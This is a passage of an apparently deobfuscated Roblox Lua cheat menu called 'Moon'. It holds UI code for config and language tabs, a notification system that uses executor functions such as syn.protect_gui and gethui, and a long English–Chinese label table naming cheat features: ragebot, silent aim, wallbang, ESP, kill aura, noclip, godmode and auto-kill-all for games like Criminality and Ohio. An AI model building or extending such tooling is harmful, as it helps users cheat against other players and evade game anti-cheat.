								D._configSystemListHost = H

								local function h(c, p, f)
									local V = p and F or O

									if f then
										c.BackgroundTransparency = 1
									end

									if p then
										I(c, D.Theme.Primary, D.Theme.Accent, nil, D)
									else
										u(c, D)
										c.BackgroundColor3 = B
									end

									if f then
										w(c, { BackgroundTransparency = V }, Y)
									else
										c.BackgroundTransparency = V
									end
								end

								local function F(c)
									local p, f = D._selectedConfig or "", D._configListEntries or {}

									for V = 1, #f, 1 do
										local e = f[V]
										V = e.Row

										if V and V.Parent then
											local f, n = e.Name == p, GetAttribute(V, "ConfigRowSelected") == true
											SetAttribute(V, "ConfigRowSelected", f)
											h(V, f, c and n ~= f)
										end
									end
								end

								local function c(p, f)
									local V = s("TextButton", {
										Text = "",
										AutoButtonColor = false,
										Size = NewUDim2(1, 0, 0, D.IsMobile and 40 or 44),
										BackgroundColor3 = B,
										BackgroundTransparency = f and 1 or O,
										BorderColor3 = k.Border,
										BorderSizePixel = 1,
									}, { P(E) })

									SetAttribute(V, "SkipFade", true)
									SetAttribute(V, "ConfigRowSelected", false)
									V.Parent = H

									v({
										Text = p,
										Position = NewUDim2(0, 14, 0, 0),
										Size = NewUDim2(1, -28, 1, 0),
										TextSize = i("ConfigInput"),
										Font = j,
										Color = k.Text,
										X = Enum.TextXAlignment.Left,
										Truncate = Enum.TextTruncate.AtEnd,
									}).Parent =
										V

									Insert(D._configListEntries, { Name = p, Row = V })
									h(V, f, f)
									SetAttribute(V, "ConfigRowSelected", f)

									Connect(V.MouseButton1Click, function()
										if D._selectedConfig == p then
											return
										end
										D._selectedConfig = p

										if D._configSystemNameInput then
											D._configSystemNameInput.Text = p
										end

										F(true)
									end)

									return V
								end

								local function h()
									local p = GetChildren(H)

									for f = 1, #p, 1 do
										local V = p[f]

										if IsA(V, "GuiObject") then
											V:Destroy()
										end
									end

									D._configListEntries = {}
									p = D:GetConfigs()

									if #p == 0 then
										local f = D:_makeInfoCard(m.EmptyText or "No configs saved")
										f.BackgroundColor3 = B
										f.BackgroundTransparency = O
										SetAttribute(f, "SkipFade", true)
										local m = FindFirstChildOfClass(f, "UICorner")

										if m then
											m.CornerRadius = NewUDim(0, E)
										end

										f.Parent = H
										return
									end

									local H = D._selectedConfig or ""

									for m = 1, #p, 1 do
										local B = p[m]
										c(B, B == H)
									end
								end

								D._refreshConfigList = h
								D._refreshCasButtons = h
								D._syncConfigSelection = F
								h()
							end

							W.Destroy = function(D)
								D:_stopGradientAnimation()

								if D.InputConnection then
									Disconnect(D.InputConnection)
									D.InputConnection = nil
								end

								local H = D.Keybinds or {}

								for m = 1, #H, 1 do
									local h = H[m]

									if h.Connection then
										Disconnect(h.Connection)
										h.Connection = nil
									end
								end

								if D._playerListConnections then
									for H = 1, #D._playerListConnections, 1 do
										Disconnect(D._playerListConnections[H])
									end

									D._playerListConnections = nil
								end

								if D._playerListUIConnections then
									for H = 1, #D._playerListUIConnections, 1 do
										Disconnect(D._playerListUIConnections[H])
									end

									D._playerListUIConnections = nil
								end

								if D._playerListDeathWatchers then
									for H, H in pairs(D._playerListDeathWatchers) do
										for m = 1, #H, 1 do
											Disconnect(H[m])
										end
									end

									D._playerListDeathWatchers = nil
								end

								if D._playerListBringConnection then
									Disconnect(D._playerListBringConnection)
									D._playerListBringConnection = nil
								end

								if D._playerListLoopTpConnection then
									Disconnect(D._playerListLoopTpConnection)
									D._playerListLoopTpConnection = nil
								end

								if D.ScreenGui and D.ScreenGui.Parent then
									D.ScreenGui:Destroy()
								end
							end

							W.CreateLanguageSystem = function(D, H)
								local m = type(H) == "table" and H or {}
								D._languageSystemConfig = m
								H = m.Title or m.Name or "Language"
								local h = D.Tabs[H]

								if h then
									h.Kind = "Language"
								else
									h = (
										D:CreateTab({
											Id = "tab-language",
											Name = H,
											Key = m.TabKey or "tab_language",
											Kind = "Language",
										})
									)
								end

								if D.ActiveTabName == H then
									D:_renderLanguageSystem()
								end

								return {
									Tab = h,
									GetLanguage = function()
										return D.Language
									end,
									SetLanguage = function(H, H)
										return D:SetLanguage(H)
									end,
								}
							end

							W._renderLanguageSystem = function(D)
								D:_clear()
								local H, m, h, B = NewRGB(22, 25, 33), 0.4, 0.15, 14

								local function O(F, E)
									local c = E and h or m
									F.BackgroundTransparency = 1

									if E then
										I(F, D.Theme.Primary, D.Theme.Accent, nil, D)
									else
										u(F, D)
										F.BackgroundColor3 = H
									end

									w(F, { BackgroundTransparency = c }, Y)
								end

								local function h(Y, F, E)
									local c, p =
										D.Language == Y, s("TextButton", {
											Text = "",
											AutoButtonColor = false,
											Size = NewUDim2(1, 0, 0, 56),
											BackgroundColor3 = H,
											BackgroundTransparency = m,
											BorderColor3 = k.Border,
											BorderSizePixel = 1,
										}, { P(B) })

									SetAttribute(p, "SkipFade", true)
									p.Parent = D.List

									v({
										Text = D:T("lang." .. Y, Y == U and "English" or "简体中文"),
										Position = NewUDim2(0, 14, 0, 8),
										Size = NewUDim2(1, -28, 0, 20),
										TextSize = i("ConfigTitle"),
										Font = j,
										Color = k.Text,
										X = Enum.TextXAlignment.Left,
									}).Parent =
										p

									v({
										Text = D:T(F, E),
										Position = NewUDim2(0, 14, 0, 30),
										Size = NewUDim2(1, -28, 0, 18),
										TextSize = i("ConfigButton"),
										Font = j,
										Color = k.SubText,
										X = Enum.TextXAlignment.Left,
									}).Parent =
										p

									O(p, c)

									Connect(p.MouseButton1Click, function()
										if D.Language == Y then
											return
										end
										D:SetLanguage(Y)
									end)
								end

								h(U, "ui.english-hint", "Default; English entries are fixed")
								h(o, "ui.chinese-hint", "Click to switch; untranslated items stay English")
							end

							if W.SearchTab then
								W:CreateTab(W.SearchTab)
							else
								W:CreateTab({ Id = "tab-search", Name = "Search", Key = "Search", Kind = "Search" })
							end

							W:CreateLanguageSystem()

							if W.GradientAnimation ~= false then
								W:_startGradientAnimation()
							end

							t = s("Frame", {
								AnchorPoint = NewVector2(0.5, 0),
								Position = NewUDim2(0.5, 0, 0, 4),
								Size = NewUDim2(0, 200, 0, 38),
								BackgroundColor3 = NewColor3(1, 1, 1),
								BorderSizePixel = 0,
								ZIndex = 5,
							}, { P(19) })

							t.Parent = A
							I(t, W.Theme.Primary, W.Theme.Accent, nil, W)

							local D = s("TextButton", {
								Text = "",
								AutoButtonColor = false,
								AnchorPoint = NewVector2(0.5, 0),
								Position = NewUDim2(0.5, 0, 0, 6),
								Size = NewUDim2(0, 196, 0, 34),
								BackgroundColor3 = NewColor3(0, 0, 0),
								BackgroundTransparency = 0.8,
								BorderSizePixel = 0,
								TextColor3 = NewColor3(1, 1, 1),
								TextSize = i("Toast"),
								Font = z,
								ZIndex = 6,
							}, { P(17), J(12, 0, 12, 0) })

							D.Parent = A
							local H, m, h, B = {}, 0, 60, "0"

							Connect(x.Heartbeat, function(x)
								Insert(H, x)
								x = Tick()

								if x - m >= 1 then
									local O = 0

									for k = 1, #H, 1 do
										O += H[k]
									end

									local k = #H

									if k > 0 then
										h = Floor(#H / O + 0.5)
									end

									H = {}

									pcall(function()
										B = Stats.Network.ServerStatsItem["Data Ping"]:GetValueString()
									end)

									m = x
								end

								if #H > 120 then
									Remove(H, 1)
								end

								D.Text = W.Title
									.. "  ·  FPS: "
									.. h
									.. "  ·  Ping: "
									.. Floor(tonumber(string.match(B, "%d+%.?%d*")))
							end)

							Connect(D.MouseButton1Click, function()
								W:Toggle()
							end)

							W._island = D
							W._islandBorder = t
							Insert(X._windows, W)
							return W
						end

						R.CreateConfigSystem = function(D, H)
							if type(H) ~= "table" then
								return nil
							end

							if typeof(H.CreateConfigSystem) == "function" and H.Tabs then
								return H:CreateConfigSystem()
							end

							if H.Window and typeof(H.Window.CreateConfigSystem) == "function" then
								local m = H.Name == "Settings" and "Config" or (H.Name or "Config")

								return H.Window:CreateConfigSystem({
									Title = m,
									TabKey = m == "Config" and "tab_config" or (H.Key or "tab_config"),
								})
							end

							local m = H.Window or D._windows[#D._windows]
							if m and typeof(m.CreateConfigSystem) == "function" then
								return m:CreateConfigSystem(H)
							end
							return nil
						end

						R.GetFontSize = function(D, D, H)
							return i(D, H)
						end

						R.DestroyAll = function(D)
							for H = 1, #D._windows, 1 do
								local m = D._windows[H]

								pcall(function()
									m:Destroy()
								end)
							end

							D._windows = {}
						end

						R.Notify = function(D, H, m, h)
							local B = D._windows[#D._windows]
							if B and B.Notify then
								return B:Notify(H, m, h)
							end
							return nil
						end

						return R
					end)()

					hitlogEnabled = true

					local tbl2 = {
						Middle = NewUDim2(0.445, 0, 0.7, 0),
						MiddleRight = NewUDim2(0.85, 0, 0.7, 0),
						MiddleLeft = NewUDim2(0.01, 0, 0.7, 0),
						Top = NewUDim2(0.445, 0, 0.007, 0),
						TopLeft = NewUDim2(0.06, 0, 0.001, 0),
						TopRight = NewUDim2(0.8, 0, 0.001, 0),
					}

					protectScreenGui = function(H)
						if syn and syn.protect_gui then
							syn.protect_gui(H)
							H.Parent = D[1]
						elseif gethui then
							H.Parent = gethui()
						else
							H.Parent = D[1]()
						end
					end

					createObject = function(H, m)
						local h = D[1](H)

						for D, H in next, m, nil do
							h[D] = H
						end

						return h
					end

					fadeObject = function(H, m)
						local h = D[1]:Create(
							H,
							TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
							{ TextTransparency = 1, TextStrokeTransparency = 1 }
						)

						Connect(h.Completed, m)
						h:Play()
					end;

					({
						new = function(H)
							assert(H, "missing argument #1 in function notifications.new(settings)")

							assert(
								typeof(H) == "table",
								D[1](
									"expected table for argument #1 in function notifications.new(settings), got %s",
									typeof(H)
								)
							)

							local m = { ui = { notificationsFrame = nil, notificationsFrame_UIListLayout = nil } }

							for h, B in next, H, nil do
								m[h] = B
							end

							setmetatable(m, { __index = D[2] })
							return m
						end,
						SetNotificationLifetime = function(H, m)
							assert(m, "missing argument #1 in function SetNotificationLifetime(number)")

							assert(
								typeof(m) == "number",
								D[1](
									"expected number for argument #1 in function SetNotificationLifetime, got %s",
									typeof(m)
								)
							)

							H.NotificationLifetime = m
						end,
						SetTextColor = function(H, m)
							assert(m, "missing argument #1 in function SetTextColor(Color3)")

							assert(
								typeof(m) == "Color3",
								D[1]("expected Color3 for argument #1 in function SetTextColor3, got %s", typeof(m))
							)

							H.TextColor = m
						end,
						SetTextSize = function(H, m)
							assert(m, "missing argument #1 in function SetTextSize(number)")

							assert(
								typeof(m) == "number",
								D[1]("expected number for argument #1 in function SetTextSize, got %s", typeof(m))
							)

							H.TextSize = m
						end,
						SetTextStrokeTransparency = function(H, m)
							assert(m, "missing argument #1 in function SetTextStrokeTransparency(number)")

							assert(
								typeof(m) == "number",
								D[1](
									"expected number for argument #1 in function SetTextStrokeTransparency, got %s",
									typeof(m)
								)
							)

							H.TextStrokeTransparency = m
						end,
						SetTextStrokeColor = function(H, m)
							assert(m, "missing argument #1 in function SetTextStrokeColor(Color3)")

							assert(
								typeof(m) == "Color3",
								D[1](
									"expected Color3 for argument #1 in function SetTextStrokeColor, got %s",
									typeof(m)
								)
							)

							H.TextStrokeColor = m
						end,
						SetTextFont = function(D, H)
							assert(H, "missing argument #1 in function SetTextFont(Font)")
							assert(typeof(H) == "string" or typeof(H) == "EnumItem")
							D.TextFont = Enum.Font[H]
						end,
						BuildNotificationUI = function(H)
							if notifications_screenGui then
								notifications_screenGui:Destroy()
							end

							getgenv().notifications_screenGui =
								createObject("ScreenGui", { ZIndexBehavior = Enum.ZIndexBehavior.Sibling })

							protectScreenGui(notifications_screenGui)

							H.ui.notificationsFrame = createObject("Frame", {
								Name = "notificationsFrame",
								Parent = notifications_screenGui,
								BackgroundColor3 = NewRGB(255, 255, 255),
								BackgroundTransparency = 1,
								Position = D[1][H.NotificationPosition],
								Size = NewUDim2(0, 236, 0, 215),
							})

							H.ui.notificationsFrame_UIListLayout = createObject("UIListLayout", {
								Name = "notificationsFrame_UIListLayout",
								Parent = H.ui.notificationsFrame,
								Padding = NewUDim(0, 1),
								SortOrder = Enum.SortOrder.LayoutOrder,
							})
						end,
						Notify = function(D, H)
							local m = createObject("TextLabel", {
								Name = "notification",
								Parent = D.ui.notificationsFrame,
								BackgroundColor3 = NewRGB(255, 255, 255),
								BackgroundTransparency = 1,
								Size = NewUDim2(0, 222, 0, 14),
								Text = H,
								Font = D.TextFont,
								TextColor3 = D.TextColor,
								TextSize = D.TextSize,
								TextStrokeColor3 = D.TextStrokeColor,
								TextStrokeTransparency = D.TextStrokeTransparency,
							})

							Delay(D.NotificationLifetime, function()
								fadeObject(m, function()
									m:Destroy()
								end)
							end)
						end,
					})
						.new({
							NotificationLifetime = 3,
							NotificationPosition = "Middle",
							TextFont = Enum.Font.Code,
							TextColor = NewRGB(255, 255, 255),
							TextSize = 15,
							TextStrokeTransparency = 0,
							TextStrokeColor = NewRGB(0, 0, 0),
						})
						:BuildNotificationUI()

					hitlog = function(H)
						if not hitlogEnabled then
							return
						end
						D[1]:Notify(H)
					end

					local window = v:CreateWindow({
						Title = "Moon",
						Version = "Lua",
						Theme = "Gothic",
						SearchTab = { Id = "tab-search", Name = "Search", Kind = "Search" },
						ConfigFolder = "Rise/Configs",
						Translations = {
							["Ability Aura"] = "技能光环",
							["allow-block-stomp"] = "允许格挡踩踏",
							["Anti Grab"] = "反抓取",
							["anti-grab"] = "反抓取",
							["anti-ragdoll"] = "防布娃娃",
							["autoload-manual-load"] = "手动加载",
							["Balloon → Balloon"] = "气球 → 气球",
							["Balloon → Bat Balloon"] = "气球 → 蝙蝠气球",
							["Balloon → Black Rose"] = "气球 → 黑玫瑰",
							["Balloon → Bunny Balloon"] = "气球 → 兔子气球",
							["Balloon → Clover Balloon"] = "气球 → 四叶草气球",
							["Balloon → Dollar Balloon"] = "气球 → 美金气球",
							["Balloon → Ghost Balloon"] = "气球 → 幽灵气球",
							["Balloon → Gold Clover Balloon"] = "气球 → 金四叶草气球",
							["Balloon → Golden Rose"] = "气球 → 金玫瑰",
							["Balloon → Heart Balloon"] = "气球 → 爱心气球",
							["Balloon → Kunai"] = "气球 → 苦无",
							["Balloon → Rainbow Umbrella"] = "气球 → 彩虹雨伞",
							["Balloon → Skull Balloon"] = "气球 → 骷髅气球",
							["Balloon → Snowflake Balloon"] = "气球 → 雪花气球",
							["Balloon → Spirit Kunai"] = "气球 → 灵魂苦无",
							["Balloon → Umbrella"] = "气球 → 雨伞",
							["Beautify Items"] = "美化物品",
							blackout = "Blackout",
							["blackout-auto-skip-shop"] = "自动跳过商店",
							["blackout-melee-killaura"] = "近战光环",
							["blackout-no-fall-damage"] = "无摔伤",
							["blackout-no-ragdoll"] = "无布娃娃",
							["blackout-ragebot"] = "愤怒机器人",
							blackout_ragebot_ignore_npc = "忽略 NPC",
							blackout_ragebot_wallbang = "穿墙射击",
							["block-spin-bypass-jump-check"] = "绕过跳跃检测",
							["block-spin-fast-stamina-regen"] = "快速体力回复",
							["block-spin-melee-aura"] = "近战光环",
							["block-spin-move"] = "移动",
							["block-spin-rage"] = "愤怒",
							["Candy Cane → Blue Candy Cane"] = "糖果棒 → 蓝糖果棒",
							["Carry Abuse"] = "携带滥用",
							["Combat Switch"] = "允许战斗换角色",
							["criminality-anti-stun-grenade"] = "防眩晕手雷",
							["criminality-auto-farm"] = "自动农场",
							["criminality-auto-respawn"] = "自动重生",
							["criminality-crack-reg"] = "撬收银机",
							["criminality-crack-save"] = "撬保险箱",
							["criminality-farm-aura"] = "农场光环",
							["criminality-fast-acceleration"] = "快速加速",
							["criminality-inf-stamina"] = "无限体力",
							["criminality-melee-aura-ignore-downed"] = "忽略倒地",
							["criminality-misc"] = "Criminality 杂项",
							["criminality-money"] = "金钱",
							["criminality-no-fall"] = "无摔伤",
							["criminality-radius"] = "半径",
							["criminality-rage"] = "Criminality 愤怒",
							["criminality-rage-aim-no-recoil-spread"] = "无后坐/扩散",
							["criminality-rage-anti-aim"] = "反自瞄",
							["criminality-rage-anti-aim- head-yaw"] = "头偏航",
							["criminality-rage-anti-aim-arm-pitch"] = "手臂俯仰",
							["criminality-rage-anti-aim-hand-mode"] = "手部模式",
							["criminality-rage-anti-aim-head-pitch"] = "头俯仰",
							["criminality-rage-anti-aim-head-pitch-mode"] = "头俯仰模式",
							["criminality-rage-anti-aim-head-yaw-mode"] = "头偏航模式",
							["criminality-rage-anti-aim-only-with-tool"] = "仅持械",
							["criminality-rage-anti-aim-spin-speed"] = "旋转速度",
							["criminality-rage-auto-repair"] = "自动修理",
							["criminality-rage-looptp"] = "循环传送",
							["criminality-rage-looptp-keybind"] = "按键",
							["criminality-rage-magic-projectile"] = "魔法弹道",
							["criminality-rage-magic-projectile-fov"] = "视野",
							["criminality-rage-magic-projectile-keybind"] = "按键",
							["criminality-rage-magic-projectile-use-fov"] = "使用范围",
							["criminality-rage-magic-projectile-wallbang"] = "穿墙射击",
							["criminality-rage-melee-aura"] = "近战光环",
							["criminality-rage-melee-aura-keybind"] = "按键",
							["criminality-rage-melee-aura-radius"] = "半径",
							["criminality-rage-melee-aura-show-anim"] = "显示动画",
							["criminality-rage-ragebot"] = "愤怒机器人",
							["criminality-rage-ragebot-auto-reload"] = "自动换弹",
							["criminality-rage-ragebot-delay"] = "延迟",
							["criminality-rage-ragebot-fov"] = "视野",
							["criminality-rage-ragebot-hit-radius"] = "命中半径",
							["criminality-rage-ragebot-ignore-downed"] = "忽略倒地",
							["criminality-rage-ragebot-instant-reload"] = "瞬间换弹",
							["criminality-rage-ragebot-keybind"] = "按键",
							["criminality-rage-ragebot-origin-radius"] = "原点半径",
							["criminality-rage-ragebot-shot-gun-range"] = "霰弹范围",
							["criminality-rage-ragebot-use-fov"] = "使用范围",
							["criminality-rage-ragebot-wallbang"] = "穿墙射击",
							["criminality-scrap"] = "废料",
							["criminality-speed"] = "速度",
							["criminality-tool"] = "工具",
							["Damage Boost"] = "伤害加强",
							["Dash Patch"] = "冲刺修补",
							Death = "死亡",
							defusal = "拆弹",
							["defusal-no-smoke"] = "无烟雾",
							["defusal-ragebot"] = "愤怒机器人",
							["defusal-ragebot-delay"] = "延迟",
							["defusal-ragebot-keybind"] = "按键",
							["defusal-ragebot-wallbang"] = "穿墙射击",
							Delay = "延迟",
							Dragon = "龙套",
							["Endless Ult"] = "延长大招",
							["ESP.Config.BlacklistColor"] = "黑名单颜色",
							["ESP.Config.Box_Type"] = "方框类型",
							["ESP.Config.BoxColor"] = "方框颜色",
							["ESP.Config.Boxes"] = "方框",
							["ESP.Config.Chams"] = "上色",
							["ESP.Config.ChamsInline"] = "填充",
							["ESP.Config.ChamsInlineAlpha"] = "填充透明度",
							["ESP.Config.ChamsInlineColor"] = "填充颜色",
							["ESP.Config.ChamsInlineSize"] = "填充大小",
							["ESP.Config.ChamsOutline"] = "描边",
							["ESP.Config.ChamsOutlineAlpha"] = "描边透明度",
							["ESP.Config.ChamsOutlineColor"] = "描边颜色",
							["ESP.Config.ChamsOutlineSize"] = "描边大小",
							["ESP.Config.Distance"] = "距离",
							["ESP.Config.Flags"] = "标记",
							["ESP.Config.Font"] = "字体",
							["ESP.Config.Health"] = "生命",
							["ESP.Config.HealthBar"] = "生命条",
							["ESP.Config.HealthHighColor"] = "满血颜色",
							["ESP.Config.HealthLowColor"] = "残血颜色",
							["ESP.Config.Name"] = "名称",
							["ESP.Config.OnlyEnemy"] = "仅敌人",
							["ESP.Config.Tool"] = "工具",
							["ESP.Config.WhitelistColor"] = "白名单颜色",
							["Fake Lag"] = "虚假延迟",
							["Fake Lag Interval"] = "虚假延迟间隔",
							["Fast Attack"] = "快速攻击",
							gakuran = "学兰",
							["gakuran-auto-parry"] = "自动格挡",
							["gakuran-auto-parry-anim-progress"] = "动画进度(%)",
							["gakuran-auto-parry-attack-distance"] = "攻击距离",
							["gakuran-auto-parry-auto-equip"] = "自动装备",
							["gakuran-auto-parry-face-angle"] = "面向角度(度)",
							["gakuran-auto-parry-face-target"] = "面向攻击者",
							["gakuran-auto-parry-range"] = "范围",
							["gakuran-auto-parry-visuals"] = "视觉",
							["gakuran-inf-stamina"] = "无限体力",
							["gakuran-instant-respawn"] = "瞬重生",
							["gakuran-instant-respawn-hp"] = "生命阈值",
							["gakuran-no-block-cd"] = "攻击时闪避",
							["gakuran-no-guardbroken"] = "无破防",
							["gakuran-no-perfectblocked"] = "无完美格挡",
							["gakuran-no-screen-blur"] = "无屏幕模糊",
							["gakuran-no-stun"] = "无硬直",
							["gakuran-no-suppressblocking"] = "无压制格挡",
							["gakuran-no-windup-recovery"] = "无前摇后摇",
							Godmode = "无敌",
							Gon = "小杰",
							["gun-grounds-rage"] = "愤怒",
							["gun-grounds-ffa-ragebot"] = "愤怒机器人",
							["Hide Server Output"] = "屏蔽输出（服务器）",
							["Hide Sound"] = "屏蔽音效",
							["Hide VFX"] = "屏蔽特效",
							Hitbox = "范围",
							["Instant Respawn"] = "秒复活",
							["Instant Ult"] = "大招秒变",
							["Kill Aura"] = "杀戮光环",
							["Kunai → Spirit Kunai"] = "苦无 → 灵魂苦无",
							Legit = "合法化",
							["misc-animation"] = "动画",
							["misc-animation-keybind"] = "按键",
							["misc-headless-korblox"] = "无头断腿",
							["misc-fake-player"] = "伪造玩家",
							["misc-fake-player-input"] = "用户",
							["misc-fake-player-apply"] = "伪造",
							["misc-fake-player-restore"] = "还原",
							["player-list-fake"] = "伪造",
							["player-list-blacklist"] = "黑名单",
							["player-list-whitelist"] = "白名单",
							["player-list-bring"] = "拉人",
							["player-list-looptp"] = "跟随",
							["player-list-search"] = "搜索玩家...",
							["player-list-refresh"] = "刷新",
							["tab-config"] = "配置",
							["tab-language"] = "语言",
							["tab-misc"] = "杂项",
							["tab-movement"] = "移动",
							["tab-player-list"] = "玩家列表",
							["tab-render"] = "视觉",
							["tab-search"] = "搜索",
							["tab-settings"] = "设置",
							["tab-themes"] = "主题",
							["misc-server-hop"] = "换服",
							["MiscState.Animation.Mode"] = "模式",
							Mode = "模式",
							["movement-desync"] = "假身",
							["movement-desync-keybind"] = "按键",
							["movement-desync-mode"] = "模式",
							["movement-fly"] = "飞行",
							["movement-high-jump"] = "高跳",
							["movement-noclip"] = "穿墙",
							["movement-speed"] = "速度",
							["movement-spin"] = "旋转",
							movement_desync_value = "动态包",
							movement_fly_value = "数值",
							movement_highjump_keybind = "按键",
							movement_highjump_value = "数值",
							movement_speed_keybind = "按键",
							movement_speed_value = "数值",
							movement_spin_keybind = "按键",
							movement_spin_mode = "模式",
							movement_spin_value = "数值",
							["MovementState.FlyKeybind"] = "按键",
							["MovementState.NoclipKeybind"] = "按键",
							["Multi Ult"] = "大招多用",
							nnp = "NNP",
							["nnp-op-gun-mod-btn"] = "应用",
							["No Dash CD"] = "冲刺无冷却",
							["No Hitstun"] = "无僵直",
							["No Jump Fatigue"] = "无跳跃疲劳",
							["No Slow"] = "无减速",
							["No Smoke"] = "无烟雾",
							["no-in-combat"] = "无战斗状态",
							["no-sit"] = "禁止坐下",
							["ohio-aim-assist"] = "辅助瞄准",
							["ohio-aim-assist-animation"] = "动画",
							["ohio-aim-assist-fov"] = "视野",
							["ohio-aim-assist-part"] = "部位",
							["ohio-aim-assist-prediction-x"] = "预判 X",
							["ohio-aim-assist-prediction-y"] = "预判 Y",
							["ohio-aim-assist-range"] = "范围",
							["ohio-aim-assist-x-speed"] = "水平速度",
							["ohio-aim-assist-y-speed"] = "垂直速度",
							["ohio-aim-assist-use-fov"] = "使用范围",
							["ohio-aim-assist-fov-color"] = "颜色",
							["ohio-silent-aim"] = "静默自瞄",
							["ohio-silent-aim-fov"] = "最大视野",
							["ohio-silent-aim-hit-chance"] = "命中率",
							["ohio-silent-aim-accuracy"] = "精度",
							["ohio-silent-aim-point-scale"] = "点位缩放",
							["ohio-silent-aim-priority"] = "命中优先级",
							["ohio-silent-aim-hitbox-head"] = "头部",
							["ohio-silent-aim-hitbox-body"] = "身体",
							["ohio-silent-aim-hitbox-arms"] = "手臂",
							["ohio-silent-aim-hitbox-legs"] = "腿部",
							["ohio-silent-aim-bullet-drop"] = "补偿下坠",
							["ohio-silent-aim-prediction"] = "补偿移动",
							["ohio-silent-aim-prediction-x"] = "预判 X",
							["ohio-silent-aim-prediction-y"] = "预判 Y",
							["ohio-silent-aim-visualize-fov"] = "显示视野",
							["ohio-silent-aim-ignore-downed"] = "忽略倒地",
							["ohio-auto-counter"] = "自动反击",
							["ohio-auto-counter-keybind"] = "按键",
							["ohio-auto-counter-on-attack"] = "受击时",
							["ohio-auto-heal"] = "自动治疗",
							["ohio-auto-heal-keybind"] = "按键",
							["ohio-auto-kill-all"] = "自动杀全服",
							["ohio-auto-kill-all-keybind"] = "按键",
							["ohio-auto-kill-blacklist"] = "自动杀黑名单",
							["ohio-auto-kill-blacklist-hide-interval-ms"] = "隐藏间隔(毫秒)",
							["ohio-auto-kill-blacklist-keybind"] = "按键",
							["ohio-auto-vest"] = "自动防弹衣",
							["ohio-auto-vest-keybind"] = "按键",
							["ohio-auto-vest-vest"] = "防弹衣",
							["ohio-farm-admin-check"] = "管理员检测",
							["ohio-farm-aura"] = "农场光环",
							["ohio-farm-auto-disassemble"] = "自动拆解",
							["ohio-farm-auto-dumbell"] = "自动哑铃",
							["ohio-farm-auto-farm"] = "自动农场",
							["ohio-farm-auto-leave"] = "自动离开",
							["ohio-farm-auto-mask"] = "自动面具",
							["ohio-farm-auto-remove"] = "自动移除",
							["ohio-farm-auto-rewards"] = "自动奖励",
							["ohio-farm-auto-sell"] = "自动出售",
							["ohio-farm-auto-use"] = "自动使用",
							["ohio-farm-mask"] = "面具",
							["ohio-farm-max-sell"] = "最大出售",
							["ohio-farm-min-cash"] = "最低农场现金",
							["ohio-farm-min-price"] = "最低农场价格",
							["ohio-farm"] = "Ohio 农场",
							["ohio-farm-min-stash-price"] = "最低仓库价格",
							["ohio-farm-stash-gem"] = "刷仓库宝石",
							["ohio-farm-use-ignore"] = "使用忽略",
							["ohio-flame-acid-kill-nearest-keybind"] = "按键",
							["ohio-flame-acid-nearest"] = "火焰/酸液最近",
							["ohio-grab-aura"] = "抓取光环",
							["ohio-grab-aura-drop"] = "丢弃",
							["ohio-grab-aura-keybind"] = "按键",
							["ohio-gun-mod"] = "枪械修改",
							["ohio-gun-mod-bullet-lifetime"] = "子弹存活时间",
							["ohio-gun-mod-bullet-speed"] = "子弹速度",
							["ohio-gun-mod-fire-debounce"] = "开火延迟",
							["ohio-gun-mod-recoil"] = "后坐力",
							["ohio-gun-mod-spread"] = "扩散",
							["ohio-handcuff-aura"] = "手铐光环",
							["ohio-handcuff-aura-keybind"] = "按键",
							["ohio-hitbox"] = "命中框",
							["ohio-hitbox-color"] = "颜色",
							["ohio-hitbox-keybind"] = "按键",
							["ohio-hitbox-part"] = "部位",
							["ohio-hitbox-hit-chance"] = "命中率",
							["ohio-hitbox-size"] = "大小",
							["ohio-hitbox-transparency"] = "透明度",
							["ohio-iff-keybind"] = "按键",
							["ohio-ignore-force-field"] = "忽略无敌",
							["ohio-kill-method"] = "方式",
							["ohio-legit"] = "合法化",
							["ohio-legit-state"] = "状态",
							["ohio-legit-inf-coffee"] = "无限咖啡",
							["ohio-melee-aura"] = "近战光环",
							["ohio-melee-aura-break-vest"] = "破甲",
							["ohio-melee-aura-vehicles"] = "载具",
							["ohio-misc"] = "Ohio 杂项",
							["ohio-misc-anti-sticky-lag"] = "防粘滞卡顿",
							["ohio-misc-beautify-balloon-balloon"] = "气球 → 气球",
							["ohio-misc-beautify-balloon-bat_balloon"] = "气球 → 蝙蝠气球",
							["ohio-misc-beautify-balloon-black_rose"] = "气球 → 黑玫瑰",
							["ohio-misc-beautify-balloon-bunny_balloon"] = "气球 → 兔子气球",
							["ohio-misc-beautify-balloon-clover_balloon"] = "气球 → 四叶草气球",
							["ohio-misc-beautify-balloon-dollar_balloon"] = "气球 → 美金气球",
							["ohio-misc-beautify-balloon-ghost_balloon"] = "气球 → 幽灵气球",
							["ohio-misc-beautify-balloon-gold_clover_balloon"] = "气球 → 金四叶草气球",
							["ohio-misc-beautify-balloon-golden_rose"] = "气球 → 金玫瑰",
							["ohio-misc-beautify-balloon-heart_balloon"] = "气球 → 爱心气球",
							["ohio-misc-beautify-balloon-kunai"] = "气球 → 苦无",
							["ohio-misc-beautify-balloon-rainbow_umbrella"] = "气球 → 彩虹雨伞",
							["ohio-misc-beautify-balloon-skull_balloon"] = "气球 → 骷髅气球",
							["ohio-misc-beautify-balloon-snowflake_balloon"] = "气球 → 雪花气球",
							["ohio-misc-beautify-balloon-spirit_kunai"] = "气球 → 灵魂苦无",
							["ohio-misc-beautify-balloon-umbrella"] = "气球 → 雨伞",
							["ohio-misc-beautify-candy-blue"] = "糖果棒 → 蓝糖果棒",
							["ohio-misc-beautify-items"] = "美化物品",
							["ohio-misc-beautify-kunai-spirit"] = "苦无 → 灵魂苦无",
							["ohio-misc-beautify-scythe-spectral"] = "镰刀 → 幽灵镰刀",
							["ohio-misc-block-vfx"] = "屏蔽特效",
							["ohio-misc-buy-gun"] = "购买枪支",
							["ohio-misc-fake-balloon"] = "假气球",
							["ohio-misc-fake-cash"] = "假现金",
							["ohio-misc-fake-cash-input"] = "数量",
							["ohio-misc-fake-wallet"] = "假钱包",
							["ohio-misc-get-balloon"] = "获取气球",
							["ohio-misc-get-gun"] = "获取枪支",
							["ohio-misc-get-kunai"] = "获取苦无",
							["ohio-misc-join-player"] = "加入玩家",
							["ohio-misc-join-plr-btn"] = "加入",
							["ohio-misc-join-plr-input"] = "玩家名称/ID",
							["ohio-misc-join-server"] = "加入服务器",
							["ohio-misc-join-vc-server"] = "语音服",
							["ohio-misc-no-camera-shake"] = "无镜头抖动",
							["ohio-misc-spawn-cash"] = "生成现金",
							["ohio-misc-spawn-cash-btn"] = "生成",
							["ohio-misc-spawn-cash-input"] = "数量",
